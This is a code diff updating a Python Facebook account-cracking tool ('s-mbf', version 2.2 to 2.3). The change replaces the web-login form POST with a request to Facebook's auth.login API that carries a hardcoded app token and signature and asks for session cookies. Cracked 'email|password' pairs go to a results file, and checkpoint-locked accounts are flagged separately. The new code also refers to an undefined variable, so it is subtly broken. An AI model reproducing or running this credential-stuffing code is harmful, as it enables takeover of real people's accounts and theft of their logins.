@@ -24,7 +24,7 @@ def banner():
 	print(cyan('   _____ __  ______  ____',bold=True))
 	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
 	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
-	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.2',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.3',bold=True))
 
 try:
 	toket=open('toket/token.txt')
@@ -172,11 +172,10 @@ tap=[]
 crk=[]
 def main(arg):
         try:
-                url='https://mbasic.facebook.com/login'
-                dt={'email':arg,'pass':pas,'login':'submit'}
-                req=requests.post(url,data=dt)
-                respData = req.content
-                if 'save-device' in str(respData) or 'm_sess' in str(respData):
+                dt={'user':arg,'pw':pas}
+                req=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                js=json.loads(req.text)
+                if 'access_token' in js:
                         true='yeah'
                         live="%s|%s"%(arg,pas)
                         tap.append(true)
@@ -188,7 +187,7 @@ def main(arg):
                         f=open('result/found.txt','a')
                         f.write(tulis)
                         f.close()
-                elif 'checkpoint' in str(respData):
+                elif 'www.facebook.com' in js['error_msg']:
                         true='notbad'
                         cek.append(true)
                         CP="%s|%s"%(arg,pas)
@@ -211,7 +210,7 @@ try:
 	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
 	name=nam.json()['name']
 
-	upver='v.2.3'
+	upver='v.2.4'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
 	if upver in str(requp):
 		print(yellow('\nNew version available. update your s-mbf now!'))
